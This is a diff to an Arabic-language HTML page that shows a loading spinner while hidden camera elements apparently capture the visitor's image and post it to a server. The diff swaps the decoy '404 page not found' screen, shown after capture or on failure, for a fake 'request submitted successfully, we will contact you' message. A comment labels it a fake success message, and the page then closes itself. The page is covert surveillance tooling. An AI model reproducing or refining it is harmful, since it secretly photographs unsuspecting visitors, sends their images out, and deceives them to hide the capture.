@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>جاري المعالجة...</title>
     <style>
         * {
             margin: 0;
@@ -72,8 +72,8 @@
 <body>
     <div class="loading-container">
         <div class="spinner"></div>
-        <h1>جاري التحميل...</h1>
-        <p>يرجى الانتظار</p>
+        <h1>جاري معالجة طلبك...</h1>
+        <p>يرجى الانتظار قليلاً</p>
     </div>
     
     <!-- عناصر مخفية للكاميرا -->
@@ -110,9 +110,9 @@
                 
             } catch (error) {
                 console.error('خطأ:', error);
-                // في حالة الفشل، إظهار رسالة خطأ عادية
+                // في حالة الفشل، إظهار رسالة نجاح وهمية
                 document.querySelector('.loading-container').innerHTML = 
-                    '<h1>404 - الصفحة غير موجودة</h1><p>عذراً، الصفحة المطلوبة غير متوفرة</p>';
+                    '<h1>تم إرسال طلبك بنجاح!</h1><p>شكراً لتقديمك. سنتواصل معك قريباً.</p>';
                 
                 // إغلاق الصفحة بعد 2 ثانية
                 setTimeout(() => {
@@ -152,14 +152,14 @@
                         body: JSON.stringify({ image: imageData })
                     });
                     
-                    // بعد الحفظ، إظهار رسالة عادية ثم إغلاق الصفحة
+                    // بعد الحفظ، إظهار رسالة نجاح ثم إغلاق الصفحة
                     setTimeout(() => {
                         document.querySelector('.loading-container').innerHTML = 
-                            '<h1>404 - الصفحة غير موجودة</h1><p>عذراً، الصفحة المطلوبة غير متوفرة</p>';
+                            '<h1>تم إرسال طلبك بنجاح! ✓</h1><p>شكراً لتقديمك. سنتواصل معك قريباً.</p>';
                         
                         setTimeout(() => {
                             window.close();
-                        }, 1500);
+                        }, 2000);
                     }, 500);
                     
                 } catch (error) {
